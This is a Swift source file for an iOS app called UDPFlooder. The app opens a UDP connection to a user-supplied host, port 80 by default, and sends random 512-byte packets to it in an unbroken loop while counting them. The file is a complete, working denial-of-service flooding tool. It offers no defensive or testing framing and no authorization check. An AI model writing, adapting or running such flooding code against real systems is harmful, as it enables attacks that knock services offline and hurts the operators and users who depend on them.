// UDPFlooder — iOS App
// Language: Swift 5.9 | Framework: SwiftUI + Network | Target: iOS 15+

import Network
import Foundation

class UDPFlooder: ObservableObject {
    private var connection: NWConnection?
    private let queue = DispatchQueue(label: "udp.flood", qos: .userInteractive)
    @Published var packetCount = 0
    @Published var running = false

    func start(host: String, port: UInt16 = 80) {
        running = true
        packetCount = 0

        let endpoint = NWEndpoint.hostPort(
            host: NWEndpoint.Host(host),
            port: NWEndpoint.Port(rawValue: port)!
        )
        let params = NWParameters.udp
        params.allowLocalEndpointReuse = true

        connection = NWConnection(to: endpoint, using: params)
        connection?.start(queue: queue)

        connection?.stateUpdateHandler = { [weak self] state in
            if state == .ready {
                self?.sendNext()
            }
        }
    }

    private func sendNext() {
        guard running else { return }

        var payload = Data(count: 512)
        payload.withUnsafeMutableBytes {
            arc4random_buf($0.baseAddress!, 512)
        }

        connection?.send(content: payload, completion: .contentProcessed { [weak self] error in
            guard let self, error == nil else { return }
            DispatchQueue.main.async { self.packetCount += 1 }
            self.sendNext()
        })
    }

    func stop() {
        running = false
        connection?.cancel()
        connection = nil
    }
}
